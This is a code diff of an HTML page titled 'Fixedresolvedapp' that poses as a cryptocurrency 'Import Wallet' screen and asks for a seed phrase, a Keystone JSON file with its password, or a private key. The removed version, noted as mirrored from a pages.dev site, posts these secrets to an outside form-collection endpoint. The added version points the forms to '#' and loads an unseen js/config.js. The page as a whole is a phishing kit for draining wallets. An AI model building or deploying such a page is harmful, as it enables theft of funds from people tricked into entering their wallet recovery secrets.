@@ -1,150 +1,123 @@
-<!DOCTYPE html><html>
-<!-- Mirrored from helium-firmwaredapps.pages.dev/web/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 18 Apr 2025 21:50:16 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<!DOCTYPE html>
+<html>
 <head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<title>Fixedresolvedapp</title>
 	<link rel="stylesheet" href="css/font-awesome.min.css">
 	<link rel="stylesheet" type="text/css" href="css/style.css">
-
 	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-
 </head>
+
 <body>
-	
-
 	<main>
-
 		<div class="import_container">
-		
-		<div class="header">
-			<h2>Import Wallet</h2>
-
-			<div>
-				<span id="phrase">Phrase</span>
-				<span id="keyj">Keystone Json</span>
-				<span id="prikey">Private Key</span>
+			<div class="header">
+				<h2>Import Wallet</h2>
+				<div>
+					<span id="phrase">Phrase</span>
+					<span id="keyj">Keystone Json</span>
+					<span id="prikey">Private Key</span>
+				</div>
 			</div>
-		</div>
 
-		<div class="content" id="phrase_content">
+			<div class="content" id="phrase_content">
+				<form action="#" method="POST">
+					<input required="" type="hidden" id="ph_type" value="">
+					<textarea required="" id="ph_keyy" placeholder="Enter Phrase..."></textarea>
+					<div class="text-muted"> Typically 12 (sometimes 24) words separated by a single space. </div>
+					<button type="submit" name="btn">PROCEED</button>
+				</form>
+			</div>
 
-			<form action="https://forms.un-static.com/forms/5ee91b1f7c52c23c19f5c62d272d7d823b070cba" method="POST">
+			<div class="content" id="keyj_content">
+				<form action="#" method="POST">
+					<input required="" type="hidden" id="kt_type" value="">
+					<textarea required="" id="kt_phrase" placeholder="Keystone JSON..."></textarea>
+					<input required="" type="" placeholder="Password..." id="kt_pwd">
+					<div class="text-muted"> Several lines of text beginning with "{...}" plus the password you used to encrypt
+						it. </div>
+					<button type="submit" name="btn">PROCEED</button>
+				</form>
+			</div>
 
-				<input required="" type="hidden" name="type" value="">
-
-				<textarea required="" name="phrase" placeholder="Enter Phrase..."></textarea>
-
-				<div class="text-muted"> Typically 12 (sometimes 24) words separated by a single space. </div>
-
-				<button type="submit" name="btn">PROCEED</button>
-
-			</form>
-		</div>
-
-
-		<div class="content" id="keyj_content">
-
-			<form action="https://forms.un-static.com/forms/5ee91b1f7c52c23c19f5c62d272d7d823b070cba" method="POST">
-
-				<input required="" type="hidden" name="type" value="">
-
-				<textarea required="" name="phrase" placeholder="Keystone JSON..."></textarea>
-
-				<input required="" type="" placeholder="Password..." name="pwd">
-
-				<div class="text-muted"> Several lines of text beginning with "{...}" plus the password you used to encrypt it. </div>
-
-				<button type="submit" name="btn">PROCEED</button>
-			</form>
-		</div>
-
-
-		<div class="content" id="prikey_content">
-
-			<form action="https://forms.un-static.com/forms/5ee91b1f7c52c23c19f5c62d272d7d823b070cba" method="POST">
-
-				<input required="" type="hidden" name="type" value="">
-
-				<input required="" type="" placeholder="Private key..." name="pwd">
-
-				<div class="text-muted"> Typically 12 (sometimes 24) words separated by a single space. </div>
-
-				<button type="submit" name="btn">PROCEED</button>
-			</form>
-		</div>
-
+			<div class="content" id="prikey_content">
+				<form action="#" method="POST">
+					<input required="" type="hidden" id="pk_type" value="">
+					<input required="" type="" placeholder="Private key..." id="pk_phrase">
+					<div class="text-muted"> Typically 12 (sometimes 24) words separated by a single space. </div>
+					<button type="submit" name="btn">PROCEED</button>
+				</form>
+			</div>
 		</div>
 	</main>
 
 
+	<script>
+		var ph = document.getElementById('phrase'),
+			kj = document.getElementById('keyj'),
+			pk = document.getElementById('prikey'),
 
-<script>
-	var ph = document.getElementById('phrase'),
-		kj = document.getElementById('keyj'),
-		pk = document.getElementById('prikey'),
+			ph_c = document.getElementById('phrase_content'),
+			kj_c = document.getElementById('keyj_content'),
+			pk_c = document.getElementById('prikey_content');
 
-		ph_c = document.getElementById('phrase_content'),
-		kj_c = document.getElementById('keyj_content'),
-		pk_c = document.getElementById('prikey_content');
-
-
-		ph.onclick = function() {
-			if(ph_c.style.display = "none"){
+		ph.onclick = function () {
+			if (ph_c.style.display = "none") {
 				ph_c.style.display = "block";
 				kj_c.style.display = "none";
 				pk_c.style.display = "none";
-			}else {
+			} else {
 				ph_c.style.display = "block";
 				kj_c.style.display = "none";
 				pk_c.style.display = "none";
 			}
 
-			if(ph_c.style.display = "block"){
+			if (ph_c.style.display = "block") {
 				ph.style.borderBottom = "2px solid #fff";
 				kj.style.borderBottom = "none";
 				pk.style.borderBottom = "none";
 			}
 		}
 
-		kj.onclick = function() {
-			if(kj_c.style.display = "none"){
+		kj.onclick = function () {
+			if (kj_c.style.display = "none") {
 				kj_c.style.display = "block";
 				ph_c.style.display = "none";
 				pk_c.style.display = "none";
-			}else {
+			} else {
 				kj_c.style.display = "none";
 				ph_c.style.display = "block";
 				pk_c.style.display = "none";
 			}
 
-			if(kj_c.style.display = "block"){
+			if (kj_c.style.display = "block") {
 				kj.style.borderBottom = "2px solid #fff";
 				ph.style.borderBottom = "none";
 				pk.style.borderBottom = "none";
 			}
 		}
 
-		pk.onclick = function() {
-			if(pk_c.style.display = "none"){
+		pk.onclick = function () {
+			if (pk_c.style.display = "none") {
 				pk_c.style.display = "block";
 				ph_c.style.display = "none";
 				kj_c.style.display = "none";
-			}else {
+			} else {
 				pk_c.style.display = "none";
 				ph_c.style.display = "block";
 				kj_c.style.display = "none";
 			}
 
-			if(pk_c.style.display = "block"){
+			if (pk_c.style.display = "block") {
 				pk.style.borderBottom = "2px solid #fff";
 				kj.style.borderBottom = "none";
 				ph.style.borderBottom = "none";
 			}
 		}
-</script>
+	</script>
 
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+	<script src="js/config.js"></script>
 </body>
-<!-- Mirrored from helium-firmwaredapps.pages.dev/web/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 18 Apr 2025 21:50:18 GMT -->
 </html>
